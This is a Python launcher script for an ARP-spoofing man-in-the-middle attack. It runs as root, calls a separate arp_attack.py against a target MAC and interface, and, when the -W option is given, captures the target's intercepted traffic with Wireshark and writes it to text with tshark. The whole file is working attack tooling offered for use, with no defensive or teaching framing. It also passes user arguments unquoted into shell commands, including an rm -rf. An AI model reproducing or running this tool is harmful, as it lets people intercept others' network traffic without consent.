#!/usr/bin/env python3


import argparse
import subprocess
import sys
import os
import time 
import glob

from subprocess import Popen, PIPE, check_output 

id_user =  os.stat("./arp_spy.py").st_uid 
class Controll :

        def __init__(self):
            self.arg_pares_on()
            self.start()
        def start(self): 
               if os.geteuid() == 0 :
                      if not os.path.exists("./capture/"):
                         os.makedirs("./capture/")
                         os.chown("./capture/",id_user,id_user)
                      else:
                         pass
               else:
                    print("\n"+"="*50+"\n"+"[*] Error   -------------| run as  root or sudo privileges"+"\n"+"="*50+"\n")
                    exit()                     
               if len(self.args.dest) == 17 and ":" in self.args.dest  and not self.args.Wireshark or\
               len(self.args.dest) == 17 and ":" in self.args.dest and  self.args.Wireshark  :
                     pass       
               else:
                     print('\n'+"*"*22)
                     print("[*] Attck Status\n"+'*'*22)
                     time.sleep(0.30)
                     print("\n"+"="*50+"\n"+"[*] Error   -----------------|->  MAC-address Error "+"\n"+"="*50+"\n")
                     exit()
              
               with open ('/proc/net/arp','r') as geteway :
                    router= geteway.readlines()
                    router = str("".join(router)).replace('\n',' ')

               if (str(self.args.Interface))  not in  router :
                    print('\n'+"*"*22)
                    print("[*] Attck Status\n"+'*'*22)
                    time.sleep(0.30)
                    print("[*] Error    -----------------|-> Interface not Found "  )
                    exit()    
               else:
                   subprocess.call(["chmod +x ./arppacket/arp_attack.py"],shell=True)
               if self.args.repate:
                    args = '-I '+self.args.Interface+' -T '+ self.args.Target +' -M ' +self.args.dest +' -R '+ self.args.repate+' '
               else:
                    args = "-I "+self.args.Interface+" -T "+ self.args.Target +" -M " +self.args.dest 
               command_proc = ' gnome-terminal  -e ' +'"'+'./arppacket/arp_attack.py ' + args +'"'                  
               call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)                  
               if self.args.Wireshark  :
                  time.sleep(5)
                  if not os.path.exists("./capture/"+self.args.Target):
                     os.makedirs("./capture/"+self.args.Target+"/Images/")
                  if os.path.exists("./capture/"+self.args.Target+"/"+self.args.Target):
                     os.remove("./capture/"+self.args.Target+"/"+self.args.Target)
                  if os.path.exists("./capture/"+self.args.Target+"/Images/") :
                     Images_folder = "./capture/"+self.args.Target+"/Images/"
                     remove_Images_folder = "rm -rf "+ Images_folder
                     os.system(remove_Images_folder)
                     os.mkdir("./capture/"+self.args.Target+"/Images/")                              
                  try:    
                     os.chown("./capture/"+self.args.Target+"/",0, 0)
                    
                  except PermissionError :
                           os.chown("./capture/"+self.args.Target+"/",id_user,id_user)
                  filter_0 = "tcp[13]==2 "
                  self.CommandWireShark= "wireshark -i "+self.args.Interface+" -k  -Y "+filter_0+\
                  " -N 'mnNdtv'  -w ./capture/"+self.args.Target+"/"+self.args.Target+" 2>/dev/null" 
                  os.system(self.CommandWireShark)                 
                  os.chown("./capture/"+self.args.Target, id_user, id_user)
                  os.chown("./capture/"+self.args.Target+"/"+self.args.Target, id_user, id_user)
                  os.chown("./capture/"+self.args.Target+"/"+"Images/", id_user, id_user)
                  commant2 =" tshark -X lua_script:"+"1"+" -r "+"./capture/"+self.args.Target+"/"+self.args.Target+\
                  " -N n  -V -T text > "+"./capture/"+self.args.Target+"/"+self.args.Target+".txt 2>/dev/null"
                  os.system(commant2)
                  os.chown("./capture/"+self.args.Target+"/"+self.args.Target+".txt", id_user, id_user)
        def arg_pares_on(self):
            parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")          
            parser.add_argument( '-I',"--Interface"  ,dest = "Interface" ,required=True   , action=None )
            parser.add_argument( '-M',"--dest"       ,dest = "dest"      ,required=True   , action=None )
            parser.add_argument( '-T',"--Target"     ,dest = "Target"    ,required=True   , action=None )
            parser.add_argument( '-R',"--repate"     ,dest = "repate"    ,required=False  , action=None )
            parser.add_argument( '-W',"--Wireshark"  ,dest = "Wireshark" ,required=False  , action='store_true')
            self.args = parser.parse_args()
            if len(sys.argv)> 1 :
               pass
            else:
               parser.print_help()
               exit()  
if __name__=='__main__':
     Controll()
